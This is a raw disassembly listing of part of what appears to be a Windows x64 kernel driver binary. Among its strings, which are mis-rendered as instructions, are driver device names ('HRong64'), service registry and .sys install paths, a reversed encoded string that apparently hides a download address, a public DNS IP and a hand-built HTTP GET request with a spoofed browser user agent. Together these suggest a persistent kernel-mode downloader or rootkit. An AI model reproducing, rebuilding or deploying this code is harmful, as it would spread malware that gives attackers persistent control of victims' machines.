   14500:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   14503:	49 ff c8             	dec    %r8
   14506:	88 01                	mov    %al,(%rcx)
   14508:	f6 c1 02             	test   $0x2,%cl
   1450b:	74 0f                	je     0x1451c
   1450d:	48 83 e9 02          	sub    $0x2,%rcx
   14511:	66 8b 04 0a          	mov    (%rdx,%rcx,1),%ax
   14515:	49 83 e8 02          	sub    $0x2,%r8
   14519:	66 89 01             	mov    %ax,(%rcx)
   1451c:	f6 c1 04             	test   $0x4,%cl
   1451f:	74 0d                	je     0x1452e
   14521:	48 83 e9 04          	sub    $0x4,%rcx
   14525:	8b 04 0a             	mov    (%rdx,%rcx,1),%eax
   14528:	49 83 e8 04          	sub    $0x4,%r8
   1452c:	89 01                	mov    %eax,(%rcx)
   1452e:	4d 8b c8             	mov    %r8,%r9
   14531:	49 c1 e9 05          	shr    $0x5,%r9
   14535:	75 50                	jne    0x14587
   14537:	4d 8b c8             	mov    %r8,%r9
   1453a:	49 c1 e9 03          	shr    $0x3,%r9
   1453e:	74 14                	je     0x14554
   14540:	48 83 e9 08          	sub    $0x8,%rcx
   14544:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   14548:	49 ff c9             	dec    %r9
   1454b:	48 89 01             	mov    %rax,(%rcx)
   1454e:	75 f0                	jne    0x14540
   14550:	49 83 e0 07          	and    $0x7,%r8
   14554:	4d 85 c0             	test   %r8,%r8
   14557:	75 07                	jne    0x14560
   14559:	49 8b c3             	mov    %r11,%rax
   1455c:	c3                   	ret
   1455d:	0f 1f 00             	nopl   (%rax)
   14560:	48 ff c9             	dec    %rcx
   14563:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   14566:	49 ff c8             	dec    %r8
   14569:	88 01                	mov    %al,(%rcx)
   1456b:	75 f3                	jne    0x14560
   1456d:	49 8b c3             	mov    %r11,%rax
   14570:	c3                   	ret
   14571:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14578:	0f 1f 84 00 00 00 00 
   1457f:	00 
   14580:	66 66 66 90          	data16 data16 xchg %ax,%ax
   14584:	66 66 90             	data16 xchg %ax,%ax
   14587:	49 81 f9 00 20 00 00 	cmp    $0x2000,%r9
   1458e:	73 42                	jae    0x145d2
   14590:	48 8b 44 0a f8       	mov    -0x8(%rdx,%rcx,1),%rax
   14595:	4c 8b 54 0a f0       	mov    -0x10(%rdx,%rcx,1),%r10
   1459a:	48 83 e9 20          	sub    $0x20,%rcx
   1459e:	48 89 41 18          	mov    %rax,0x18(%rcx)
   145a2:	4c 89 51 10          	mov    %r10,0x10(%rcx)
   145a6:	48 8b 44 0a 08       	mov    0x8(%rdx,%rcx,1),%rax
   145ab:	4c 8b 14 0a          	mov    (%rdx,%rcx,1),%r10
   145af:	49 ff c9             	dec    %r9
   145b2:	48 89 41 08          	mov    %rax,0x8(%rcx)
   145b6:	4c 89 11             	mov    %r10,(%rcx)
   145b9:	75 d5                	jne    0x14590
   145bb:	49 83 e0 1f          	and    $0x1f,%r8
   145bf:	e9 73 ff ff ff       	jmp    0x14537
   145c4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   145cb:	00 00 00 00 00 
   145d0:	66 90                	xchg   %ax,%ax
   145d2:	48 81 fa 00 f0 ff ff 	cmp    $0xfffffffffffff000,%rdx
   145d9:	77 b5                	ja     0x14590
   145db:	b8 20 00 00 00       	mov    $0x20,%eax
   145e0:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   145e7:	0f 18 04 0a          	prefetchnta (%rdx,%rcx,1)
   145eb:	0f 18 44 0a 40       	prefetchnta 0x40(%rdx,%rcx,1)
   145f0:	ff c8                	dec    %eax
   145f2:	75 ec                	jne    0x145e0
   145f4:	48 81 c1 00 10 00 00 	add    $0x1000,%rcx
   145fb:	b8 40 00 00 00       	mov    $0x40,%eax
   14600:	4c 8b 4c 0a f8       	mov    -0x8(%rdx,%rcx,1),%r9
   14605:	4c 8b 54 0a f0       	mov    -0x10(%rdx,%rcx,1),%r10
   1460a:	4c 0f c3 49 f8       	movnti %r9,-0x8(%rcx)
   1460f:	4c 0f c3 51 f0       	movnti %r10,-0x10(%rcx)
   14614:	4c 8b 4c 0a e8       	mov    -0x18(%rdx,%rcx,1),%r9
   14619:	4c 8b 54 0a e0       	mov    -0x20(%rdx,%rcx,1),%r10
   1461e:	4c 0f c3 49 e8       	movnti %r9,-0x18(%rcx)
   14623:	4c 0f c3 51 e0       	movnti %r10,-0x20(%rcx)
   14628:	4c 8b 4c 0a d8       	mov    -0x28(%rdx,%rcx,1),%r9
   1462d:	4c 8b 54 0a d0       	mov    -0x30(%rdx,%rcx,1),%r10
   14632:	48 83 e9 40          	sub    $0x40,%rcx
   14636:	4c 0f c3 49 18       	movnti %r9,0x18(%rcx)
   1463b:	4c 0f c3 51 10       	movnti %r10,0x10(%rcx)
   14640:	4c 8b 4c 0a 08       	mov    0x8(%rdx,%rcx,1),%r9
   14645:	4c 8b 14 0a          	mov    (%rdx,%rcx,1),%r10
   14649:	ff c8                	dec    %eax
   1464b:	4c 0f c3 49 08       	movnti %r9,0x8(%rcx)
   14650:	4c 0f c3 11          	movnti %r10,(%rcx)
   14654:	75 aa                	jne    0x14600
   14656:	49 81 e8 00 10 00 00 	sub    $0x1000,%r8
   1465d:	49 81 f8 00 10 00 00 	cmp    $0x1000,%r8
   14664:	0f 83 71 ff ff ff    	jae    0x145db
   1466a:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   1466f:	e9 ba fe ff ff       	jmp    0x1452e
   14674:	cc                   	int3
   14675:	cc                   	int3
   14676:	cc                   	int3
   14677:	cc                   	int3
   14678:	cc                   	int3
   14679:	cc                   	int3
   1467a:	cc                   	int3
   1467b:	cc                   	int3
   1467c:	40 53                	rex push %rbx
   1467e:	48 83 ec 20          	sub    $0x20,%rsp
   14682:	45 8b 18             	mov    (%r8),%r11d
   14685:	48 8b da             	mov    %rdx,%rbx
   14688:	4c 8b c9             	mov    %rcx,%r9
   1468b:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   1468f:	41 f6 00 04          	testb  $0x4,(%r8)
   14693:	4c 8b d1             	mov    %rcx,%r10
   14696:	74 13                	je     0x146ab
   14698:	41 8b 40 08          	mov    0x8(%r8),%eax
   1469c:	4d 63 50 04          	movslq 0x4(%r8),%r10
   146a0:	f7 d8                	neg    %eax
   146a2:	4c 03 d1             	add    %rcx,%r10
   146a5:	48 63 c8             	movslq %eax,%rcx
   146a8:	4c 23 d1             	and    %rcx,%r10
   146ab:	49 63 c3             	movslq %r11d,%rax
   146ae:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   146b2:	48 8b 43 10          	mov    0x10(%rbx),%rax
   146b6:	8b 48 08             	mov    0x8(%rax),%ecx
   146b9:	48 03 4b 08          	add    0x8(%rbx),%rcx
   146bd:	f6 41 03 0f          	testb  $0xf,0x3(%rcx)
   146c1:	74 0c                	je     0x146cf
   146c3:	0f b6 41 03          	movzbl 0x3(%rcx),%eax
   146c7:	83 e0 f0             	and    $0xfffffff0,%eax
   146ca:	48 98                	cltq
   146cc:	4c 03 c8             	add    %rax,%r9
   146cf:	4c 33 ca             	xor    %rdx,%r9
   146d2:	49 8b c9             	mov    %r9,%rcx
   146d5:	48 83 c4 20          	add    $0x20,%rsp
   146d9:	5b                   	pop    %rbx
   146da:	e9 e1 fa ff ff       	jmp    0x141c0
   146df:	cc                   	int3
   146e0:	cc                   	int3
   146e1:	cc                   	int3
   146e2:	cc                   	int3
   146e3:	cc                   	int3
   146e4:	cc                   	int3
   146e5:	cc                   	int3
   146e6:	cc                   	int3
   146e7:	cc                   	int3
   146e8:	48 83 ec 28          	sub    $0x28,%rsp
   146ec:	4d 8b 41 38          	mov    0x38(%r9),%r8
   146f0:	48 8b ca             	mov    %rdx,%rcx
   146f3:	49 8b d1             	mov    %r9,%rdx
   146f6:	e8 81 ff ff ff       	call   0x1467c
   146fb:	b8 01 00 00 00       	mov    $0x1,%eax
   14700:	48 83 c4 28          	add    $0x28,%rsp
   14704:	c3                   	ret
   14705:	cc                   	int3
   14706:	cc                   	int3
   14707:	cc                   	int3
   14708:	cc                   	int3
   14709:	cc                   	int3
   1470a:	cc                   	int3
   1470b:	cc                   	int3
   1470c:	ff 25 5e 0a 00 00    	jmp    *0xa5e(%rip)        # 0x15170
   14712:	cc                   	int3
   14713:	cc                   	int3
   14714:	cc                   	int3
   14715:	cc                   	int3
   14716:	cc                   	int3
   14717:	cc                   	int3
   14718:	cc                   	int3
   14719:	cc                   	int3
   1471a:	cc                   	int3
   1471b:	cc                   	int3
   1471c:	cc                   	int3
   1471d:	cc                   	int3
   1471e:	cc                   	int3
   1471f:	cc                   	int3
   14720:	5c                   	pop    %rsp
   14721:	00 52 00             	add    %dl,0x0(%rdx)
   14724:	65 00 67 00          	add    %ah,%gs:0x0(%rdi)
   14728:	69 00 73 00 74 00    	imul   $0x740073,(%rax),%eax
   1472e:	72 00                	jb     0x14730
   14730:	79 00                	jns    0x14732
   14732:	5c                   	pop    %rsp
   14733:	00 4d 00             	add    %cl,0x0(%rbp)
   14736:	61                   	(bad)
   14737:	00 63 00             	add    %ah,0x0(%rbx)
   1473a:	68 00 69 00 6e       	push   $0x6e006900
   1473f:	00 65 00             	add    %ah,0x0(%rbp)
   14742:	5c                   	pop    %rsp
   14743:	00 53 00             	add    %dl,0x0(%rbx)
   14746:	59                   	pop    %rcx
   14747:	00 53 00             	add    %dl,0x0(%rbx)
   1474a:	54                   	push   %rsp
   1474b:	00 45 00             	add    %al,0x0(%rbp)
   1474e:	4d 00 5c 00 43       	rex.WRB add %r11b,0x43(%r8,%rax,1)
   14753:	00 75 00             	add    %dh,0x0(%rbp)
   14756:	72 00                	jb     0x14758
   14758:	72 00                	jb     0x1475a
   1475a:	65 00 6e 00          	add    %ch,%gs:0x0(%rsi)
   1475e:	74 00                	je     0x14760
   14760:	43 00 6f 00          	rex.XB add %bpl,0x0(%r15)
   14764:	6e                   	outsb  (%rsi),(%dx)
   14765:	00 74 00 72          	add    %dh,0x72(%rax,%rax,1)
   14769:	00 6f 00             	add    %ch,0x0(%rdi)
   1476c:	6c                   	insb   (%dx),(%rdi)
   1476d:	00 53 00             	add    %dl,0x0(%rbx)
   14770:	65 00 74 00 5c       	add    %dh,%gs:0x5c(%rax,%rax,1)
   14775:	00 73 00             	add    %dh,0x0(%rbx)
   14778:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   1477c:	76 00                	jbe    0x1477e
   1477e:	69 00 63 00 65 00    	imul   $0x650063,(%rax),%eax
   14784:	73 00                	jae    0x14786
   14786:	5c                   	pop    %rsp
   14787:	00 25 00 77 00 73    	add    %ah,0x73007700(%rip)        # 0x7301be8d
   1478d:	00 00                	add    %al,(%rax)
   1478f:	00 5c 00 44          	add    %bl,0x44(%rax,%rax,1)
   14793:	00 65 00             	add    %ah,0x0(%rbp)
   14796:	76 00                	jbe    0x14798
   14798:	69 00 63 00 65 00    	imul   $0x650063,(%rax),%eax
   1479e:	5c                   	pop    %rsp
   1479f:	00 48 00             	add    %cl,0x0(%rax)
   147a2:	52                   	push   %rdx
   147a3:	00 6f 00             	add    %ch,0x0(%rdi)
   147a6:	6e                   	outsb  (%rsi),(%dx)
   147a7:	00 67 00             	add    %ah,0x0(%rdi)
   147aa:	36 00 34 00          	ss add %dh,(%rax,%rax,1)
   147ae:	00 00                	add    %al,(%rax)
   147b0:	5c                   	pop    %rsp
   147b1:	00 44 00 6f          	add    %al,0x6f(%rax,%rax,1)
   147b5:	00 73 00             	add    %dh,0x0(%rbx)
   147b8:	44 00 65 00          	add    %r12b,0x0(%rbp)
   147bc:	76 00                	jbe    0x147be
   147be:	69 00 63 00 65 00    	imul   $0x650063,(%rax),%eax
   147c4:	73 00                	jae    0x147c6
   147c6:	5c                   	pop    %rsp
   147c7:	00 48 00             	add    %cl,0x0(%rax)
   147ca:	52                   	push   %rdx
   147cb:	00 6f 00             	add    %ch,0x0(%rdi)
   147ce:	6e                   	outsb  (%rsi),(%dx)
   147cf:	00 67 00             	add    %ah,0x0(%rdi)
   147d2:	36 00 34 00          	ss add %dh,(%rax,%rax,1)
   147d6:	43 00 44 00 4f       	add    %al,0x4f(%r8,%r8,1)
   147db:	00 00                	add    %al,(%rax)
   147dd:	00 cc                	add    %cl,%ah
   147df:	cc                   	int3
   147e0:	4b 00 65 00          	rex.WXB add %spl,0x0(%r13)
   147e4:	44 00 65 00          	add    %r12b,0x0(%rbp)
   147e8:	6c                   	insb   (%dx),(%rdi)
   147e9:	00 61 00             	add    %ah,0x0(%rcx)
   147ec:	79 00                	jns    0x147ee
   147ee:	45 00 78 00          	add    %r15b,0x0(%r8)
   147f2:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   147f6:	75 00                	jne    0x147f8
   147f8:	74 00                	je     0x147fa
   147fa:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%rax),%eax
   14800:	54                   	push   %rsp
   14801:	00 68 00             	add    %ch,0x0(%rax)
   14804:	72 00                	jb     0x14806
   14806:	65 00 61 00          	add    %ah,%gs:0x0(%rcx)
   1480a:	64 00 00             	add    %al,%fs:(%rax)
   1480d:	00 cc                	add    %cl,%ah
   1480f:	cc                   	int3
   14810:	25 73 00 cc cc       	and    $0xcccc0073,%eax
   14815:	cc                   	int3
   14816:	cc                   	int3
   14817:	cc                   	int3
   14818:	cc                   	int3
   14819:	cc                   	int3
   1481a:	cc                   	int3
   1481b:	cc                   	int3
   1481c:	cc                   	int3
   1481d:	cc                   	int3
   1481e:	cc                   	int3
   1481f:	cc                   	int3
   14820:	5c                   	pop    %rsp
   14821:	00 53 00             	add    %dl,0x0(%rbx)
   14824:	79 00                	jns    0x14826
   14826:	73 00                	jae    0x14828
   14828:	74 00                	je     0x1482a
   1482a:	65 00 6d 00          	add    %ch,%gs:0x0(%rbp)
   1482e:	52                   	push   %rdx
   1482f:	00 6f 00             	add    %ch,0x0(%rdi)
   14832:	6f                   	outsl  (%rsi),(%dx)
   14833:	00 74 00 5c          	add    %dh,0x5c(%rax,%rax,1)
   14837:	00 73 00             	add    %dh,0x0(%rbx)
   1483a:	79 00                	jns    0x1483c
   1483c:	73 00                	jae    0x1483e
   1483e:	74 00                	je     0x14840
   14840:	65 00 6d 00          	add    %ch,%gs:0x0(%rbp)
   14844:	33 00                	xor    (%rax),%eax
   14846:	32 00                	xor    (%rax),%al
   14848:	5c                   	pop    %rsp
   14849:	00 64 00 72          	add    %ah,0x72(%rax,%rax,1)
   1484d:	00 69 00             	add    %ch,0x0(%rcx)
   14850:	76 00                	jbe    0x14852
   14852:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   14856:	73 00                	jae    0x14858
   14858:	5c                   	pop    %rsp
   14859:	00 00                	add    %al,(%rax)
   1485b:	00 cc                	add    %cl,%ah
   1485d:	cc                   	int3
   1485e:	cc                   	int3
   1485f:	cc                   	int3
   14860:	25 00 73 00 25       	and    $0x25007300,%eax
   14865:	00 73 00             	add    %dh,0x0(%rbx)
   14868:	2e 00 73 00          	cs add %dh,0x0(%rbx)
   1486c:	79 00                	jns    0x1486e
   1486e:	73 00                	jae    0x14870
   14870:	00 00                	add    %al,(%rax)
   14872:	cc                   	int3
   14873:	cc                   	int3
   14874:	cc                   	int3
   14875:	cc                   	int3
   14876:	cc                   	int3
   14877:	cc                   	int3
   14878:	cc                   	int3
   14879:	cc                   	int3
   1487a:	cc                   	int3
   1487b:	cc                   	int3
   1487c:	cc                   	int3
   1487d:	cc                   	int3
   1487e:	cc                   	int3
   1487f:	cc                   	int3
   14880:	68 74 74 70 73       	push   $0x73707474
   14885:	00 cc                	add    %cl,%ah
   14887:	cc                   	int3
   14888:	cc                   	int3
   14889:	cc                   	int3
   1488a:	cc                   	int3
   1488b:	cc                   	int3
   1488c:	cc                   	int3
   1488d:	cc                   	int3
   1488e:	cc                   	int3
   1488f:	cc                   	int3
   14890:	68 74 74 70 00       	push   $0x707474
   14895:	cc                   	int3
   14896:	cc                   	int3
   14897:	cc                   	int3
   14898:	cc                   	int3
   14899:	cc                   	int3
   1489a:	cc                   	int3
   1489b:	cc                   	int3
   1489c:	cc                   	int3
   1489d:	cc                   	int3
   1489e:	cc                   	int3
   1489f:	cc                   	int3
   148a0:	3a 00                	cmp    (%rax),%al
   148a2:	cc                   	int3
   148a3:	cc                   	int3
   148a4:	cc                   	int3
   148a5:	cc                   	int3
   148a6:	cc                   	int3
   148a7:	cc                   	int3
   148a8:	cc                   	int3
   148a9:	cc                   	int3
   148aa:	cc                   	int3
   148ab:	cc                   	int3
   148ac:	cc                   	int3
   148ad:	cc                   	int3
   148ae:	cc                   	int3
   148af:	cc                   	int3
   148b0:	2f                   	(bad)
   148b1:	00 cc                	add    %cl,%ah
   148b3:	cc                   	int3
   148b4:	cc                   	int3
   148b5:	cc                   	int3
   148b6:	cc                   	int3
   148b7:	cc                   	int3
   148b8:	cc                   	int3
   148b9:	cc                   	int3
   148ba:	cc                   	int3
   148bb:	cc                   	int3
   148bc:	cc                   	int3
   148bd:	cc                   	int3
   148be:	cc                   	int3
   148bf:	cc                   	int3
   148c0:	53                   	push   %rbx
   148c1:	00 79 00             	add    %bh,0x0(%rcx)
   148c4:	73 00                	jae    0x148c6
   148c6:	74 00                	je     0x148c8
   148c8:	65 00 6d 00          	add    %ch,%gs:0x0(%rbp)
   148cc:	20 00                	and    %al,(%rax)
   148ce:	52                   	push   %rdx
   148cf:	00 65 00             	add    %ah,0x0(%rbp)
   148d2:	73 00                	jae    0x148d4
   148d4:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   148d8:	76 00                	jbe    0x148da
   148da:	65 00 64 00 00       	add    %ah,%gs:0x0(%rax,%rax,1)
   148df:	00 73 00             	add    %dh,0x0(%rbx)
   148e2:	79 00                	jns    0x148e4
   148e4:	73 00                	jae    0x148e6
   148e6:	74 00                	je     0x148e8
   148e8:	65 00 6d 00          	add    %ch,%gs:0x0(%rbp)
   148ec:	33 00                	xor    (%rax),%eax
   148ee:	32 00                	xor    (%rax),%al
   148f0:	5c                   	pop    %rsp
   148f1:	00 64 00 72          	add    %ah,0x72(%rax,%rax,1)
   148f5:	00 69 00             	add    %ch,0x0(%rcx)
   148f8:	76 00                	jbe    0x148fa
   148fa:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   148fe:	73 00                	jae    0x14900
   14900:	5c                   	pop    %rsp
   14901:	00 25 00 77 00 73    	add    %ah,0x73007700(%rip)        # 0x7301c007
   14907:	00 2e                	add    %ch,(%rsi)
   14909:	00 73 00             	add    %dh,0x0(%rbx)
   1490c:	79 00                	jns    0x1490e
   1490e:	73 00                	jae    0x14910
   14910:	00 00                	add    %al,(%rax)
   14912:	cc                   	int3
   14913:	cc                   	int3
   14914:	cc                   	int3
   14915:	cc                   	int3
   14916:	cc                   	int3
   14917:	cc                   	int3
   14918:	cc                   	int3
   14919:	cc                   	int3
   1491a:	cc                   	int3
   1491b:	cc                   	int3
   1491c:	cc                   	int3
   1491d:	cc                   	int3
   1491e:	cc                   	int3
   1491f:	cc                   	int3
   14920:	49 00 6d 00          	rex.WB add %bpl,0x0(%r13)
   14924:	61                   	(bad)
   14925:	00 67 00             	add    %ah,0x0(%rdi)
   14928:	65 00 50 00          	add    %dl,%gs:0x0(%rax)
   1492c:	61                   	(bad)
   1492d:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   14931:	00 00                	add    %al,(%rax)
   14933:	00 cc                	add    %cl,%ah
   14935:	cc                   	int3
   14936:	cc                   	int3
   14937:	cc                   	int3
   14938:	cc                   	int3
   14939:	cc                   	int3
   1493a:	cc                   	int3
   1493b:	cc                   	int3
   1493c:	cc                   	int3
   1493d:	cc                   	int3
   1493e:	cc                   	int3
   1493f:	cc                   	int3
   14940:	53                   	push   %rbx
   14941:	00 74 00 61          	add    %dh,0x61(%rax,%rax,1)
   14945:	00 72 00             	add    %dh,0x0(%rdx)
   14948:	74 00                	je     0x1494a
   1494a:	00 00                	add    %al,(%rax)
   1494c:	cc                   	int3
   1494d:	cc                   	int3
   1494e:	cc                   	int3
   1494f:	cc                   	int3
   14950:	45 00 72 00          	add    %r14b,0x0(%r10)
   14954:	72 00                	jb     0x14956
   14956:	6f                   	outsl  (%rsi),(%dx)
   14957:	00 72 00             	add    %dh,0x0(%rdx)
   1495a:	43 00 6f 00          	rex.XB add %bpl,0x0(%r15)
   1495e:	6e                   	outsb  (%rsi),(%dx)
   1495f:	00 74 00 72          	add    %dh,0x72(%rax,%rax,1)
   14963:	00 6f 00             	add    %ch,0x0(%rdi)
   14966:	6c                   	insb   (%dx),(%rdi)
   14967:	00 00                	add    %al,(%rax)
   14969:	00 cc                	add    %cl,%ah
   1496b:	cc                   	int3
   1496c:	cc                   	int3
   1496d:	cc                   	int3
   1496e:	cc                   	int3
   1496f:	cc                   	int3
   14970:	54                   	push   %rsp
   14971:	00 79 00             	add    %bh,0x0(%rcx)
   14974:	70 00                	jo     0x14976
   14976:	65 00 00             	add    %al,%gs:(%rax)
   14979:	00 cc                	add    %cl,%ah
   1497b:	cc                   	int3
   1497c:	cc                   	int3
   1497d:	cc                   	int3
   1497e:	cc                   	int3
   1497f:	cc                   	int3
   14980:	54                   	push   %rsp
   14981:	00 61 00             	add    %ah,0x0(%rcx)
   14984:	67 00 00             	add    %al,(%eax)
   14987:	00 cc                	add    %cl,%ah
   14989:	cc                   	int3
   1498a:	cc                   	int3
   1498b:	cc                   	int3
   1498c:	cc                   	int3
   1498d:	cc                   	int3
   1498e:	cc                   	int3
   1498f:	cc                   	int3
   14990:	47 00 72 00          	rex.RXB add %r14b,0x0(%r10)
   14994:	6f                   	outsl  (%rsi),(%dx)
   14995:	00 75 00             	add    %dh,0x0(%rbp)
   14998:	70 00                	jo     0x1499a
   1499a:	00 00                	add    %al,(%rax)
   1499c:	cc                   	int3
   1499d:	cc                   	int3
   1499e:	cc                   	int3
   1499f:	cc                   	int3
   149a0:	3d 3d 77 5a 77       	cmp    $0x775a773d,%eax
   149a5:	70 6d                	jo     0x14a14
   149a7:	4c 34 39             	rex.WR xor $0x39,%al
   149aa:	53                   	push   %rbx
   149ab:	62 76 4e 6d 4c       	(bad)
   149b0:	7a 4e                	jp     0x14a00
   149b2:	6d                   	insl   (%dx),(%rdi)
   149b3:	62 31 6c 58 61       	(bad)
   149b8:	73 46                	jae    0x14a00
   149ba:	6d                   	insl   (%dx),(%rdi)
   149bb:	4c 31 39             	xor    %r15,(%rcx)
   149be:	47 61                	rex.RXB (bad)
   149c0:	36 64 6d             	ss fs insl (%dx),(%rdi)
   149c3:	62                   	(bad)
   149c4:	68 68 57 4c 75       	push   $0x754c5768
   149c9:	4e 57                	rex.WRX push %rdi
   149cb:	4c 7a 4e             	rex.WR jp 0x14a1c
   149ce:	33 62 75             	xor    0x75(%rdx),%esp
   149d1:	55                   	push   %rbp
   149d2:	6d                   	insl   (%dx),(%rdi)
   149d3:	63 31                	movsxd (%rcx),%esi
   149d5:	52                   	push   %rdx
   149d6:	33 59 70             	xor    0x70(%rcx),%ebx
   149d9:	42 6e                	rex.X outsb (%rsi),(%dx)
   149db:	64 70 52             	fs jo  0x14a30
   149de:	32 4c 76 6f          	xor    0x6f(%rsi,%rsi,2),%cl
   149e2:	44 63 30             	movsxd (%rax),%r14d
   149e5:	52                   	push   %rdx
   149e6:	48 61                	rex.W (bad)
   149e8:	00 cc                	add    %cl,%ah
   149ea:	cc                   	int3
   149eb:	cc                   	int3
   149ec:	cc                   	int3
   149ed:	cc                   	int3
   149ee:	cc                   	int3
   149ef:	cc                   	int3
   149f0:	31 31                	xor    %esi,(%rcx)
   149f2:	34 2e                	xor    $0x2e,%al
   149f4:	31 31                	xor    %esi,(%rcx)
   149f6:	34 2e                	xor    $0x2e,%al
   149f8:	31 31                	xor    %esi,(%rcx)
   149fa:	34 2e                	xor    $0x2e,%al
   149fc:	31 31                	xor    %esi,(%rcx)
   149fe:	34 00                	xor    $0x0,%al
   14a00:	2e 00 cc             	cs add %cl,%ah
   14a03:	cc                   	int3
   14a04:	cc                   	int3
   14a05:	cc                   	int3
   14a06:	cc                   	int3
   14a07:	cc                   	int3
   14a08:	cc                   	int3
   14a09:	cc                   	int3
   14a0a:	cc                   	int3
   14a0b:	cc                   	int3
   14a0c:	cc                   	int3
   14a0d:	cc                   	int3
   14a0e:	cc                   	int3
   14a0f:	cc                   	int3
   14a10:	31 32                	xor    %esi,(%rdx)
   14a12:	37                   	(bad)
   14a13:	2e 30 2e             	cs xor %ch,(%rsi)
   14a16:	30 2e                	xor    %ch,(%rsi)
   14a18:	31 00                	xor    %eax,(%rax)
   14a1a:	cc                   	int3
   14a1b:	cc                   	int3
   14a1c:	cc                   	int3
   14a1d:	cc                   	int3
   14a1e:	cc                   	int3
   14a1f:	cc                   	int3
   14a20:	47                   	rex.RXB
   14a21:	45 54                	rex.RB push %r12
   14a23:	20 2f                	and    %ch,(%rdi)
   14a25:	25 73 20 48 54       	and    $0x54482073,%eax
   14a2a:	54                   	push   %rsp
   14a2b:	50                   	push   %rax
   14a2c:	2f                   	(bad)
   14a2d:	31 2e                	xor    %ebp,(%rsi)
   14a2f:	31 0d 0a 41 63 63    	xor    %ecx,0x6363410a(%rip)        # 0x63648b3f
   14a35:	65 70 74             	gs jo  0x14aac
   14a38:	3a 20                	cmp    (%rax),%ah
   14a3a:	2a 2f                	sub    (%rdi),%ch
   14a3c:	2a 0d 0a 41 63 63    	sub    0x6363410a(%rip),%cl        # 0x63648b4c
   14a42:	65 70 74             	gs jo  0x14ab9
   14a45:	2d 4c 61 6e 67       	sub    $0x676e614c,%eax
   14a4a:	75 61                	jne    0x14aad
   14a4c:	67 65 3a 20          	cmp    %gs:(%eax),%ah
   14a50:	65 6e                	outsb  %gs:(%rsi),(%dx)
   14a52:	2d 55 53 0d 0a       	sub    $0xa0d5355,%eax
   14a57:	55                   	push   %rbp
   14a58:	73 65                	jae    0x14abf
   14a5a:	72 2d                	jb     0x14a89
   14a5c:	41                   	rex.B
   14a5d:	67 65 6e             	outsb  %gs:(%esi),(%dx)
   14a60:	74 3a                	je     0x14a9c
   14a62:	20 4d 6f             	and    %cl,0x6f(%rbp)
   14a65:	7a 69                	jp     0x14ad0
   14a67:	6c                   	insb   (%dx),(%rdi)
   14a68:	6c                   	insb   (%dx),(%rdi)
   14a69:	61                   	(bad)
   14a6a:	2f                   	(bad)
   14a6b:	36 2e 32 20          	ss cs xor (%rax),%ah
   14a6f:	28 63 6f             	sub    %ah,0x6f(%rbx)
   14a72:	6d                   	insl   (%dx),(%rdi)
   14a73:	70 61                	jo     0x14ad6
   14a75:	74 69                	je     0x14ae0
   14a77:	62 6c 65 3b 20       	(bad)
   14a7c:	4d 53                	rex.WRB push %r11
   14a7e:	49                   	rex.WB
   14a7f:	45 20 38             	and    %r15b,(%r8)
   14a82:	2e 31 32             	cs xor %esi,(%rdx)
   14a85:	3b 20                	cmp    (%rax),%esp
   14a87:	57                   	push   %rdi
   14a88:	69 6e 64 6f 77 73 20 	imul   $0x2073776f,0x64(%rsi),%ebp
   14a8f:	4e 54                	rex.WRX push %rsp
   14a91:	20 36                	and    %dh,(%rsi)
   14a93:	2e 32 29             	cs xor (%rcx),%ch
   14a96:	0d 0a 48 6f 73       	or     $0x736f480a,%eax
   14a9b:	74 3a                	je     0x14ad7
   14a9d:	20 25 73 0d 0a 43    	and    %ah,0x430a0d73(%rip)        # 0x430b5816
   14aa3:	6f                   	outsl  (%rsi),(%dx)
   14aa4:	6e                   	outsb  (%rsi),(%dx)
   14aa5:	6e                   	outsb  (%rsi),(%dx)
   14aa6:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   14aab:	6e                   	outsb  (%rsi),(%dx)
   14aac:	3a 20                	cmp    (%rax),%ah
   14aae:	4b                   	rex.WXB
   14aaf:	65 65 70 2d          	gs gs jo 0x14ae0
   14ab3:	41 6c                	rex.B insb (%dx),(%rdi)
   14ab5:	69 76 65 0d 0a 0d 0a 	imul   $0xa0d0a0d,0x65(%rsi),%esi
   14abc:	00 cc                	add    %cl,%ah
   14abe:	cc                   	int3
   14abf:	cc                   	int3
   14ac0:	48 54                	rex.W push %rsp
   14ac2:	54                   	push   %rsp
   14ac3:	50                   	push   %rax
   14ac4:	2f                   	(bad)
   14ac5:	31 2e                	xor    %ebp,(%rsi)
   14ac7:	31 20                	xor    %esp,(%rax)
   14ac9:	32 30                	xor    (%rax),%dh
   14acb:	30 20                	xor    %ah,(%rax)
   14acd:	4f                   	rex.WRXB
   14ace:	4b 00 43 6f          	rex.WXB add %al,0x6f(%r11)
   14ad2:	6e                   	outsb  (%rsi),(%dx)
   14ad3:	74 65                	je     0x14b3a
   14ad5:	6e                   	outsb  (%rsi),(%dx)
   14ad6:	74 2d                	je     0x14b05
   14ad8:	4c                   	rex.WR
   14ad9:	65 6e                	outsb  %gs:(%rsi),(%dx)
   14adb:	67 74 68             	addr32 je 0x14b46
   14ade:	3a 00                	cmp    (%rax),%al
   14ae0:	0d 0a 0d 0a 00       	or     $0xa0d0a,%eax
   14ae5:	cc                   	int3
   14ae6:	cc                   	int3
   14ae7:	cc                   	int3
   14ae8:	cc                   	int3
   14ae9:	cc                   	int3
   14aea:	cc                   	int3
   14aeb:	cc                   	int3
   14aec:	cc                   	int3
   14aed:	cc                   	int3
   14aee:	cc                   	int3
   14aef:	cc                   	int3
   14af0:	5c                   	pop    %rsp
   14af1:	00 44 00 65          	add    %al,0x65(%rax,%rax,1)
   14af5:	00 76 00             	add    %dh,0x0(%rsi)
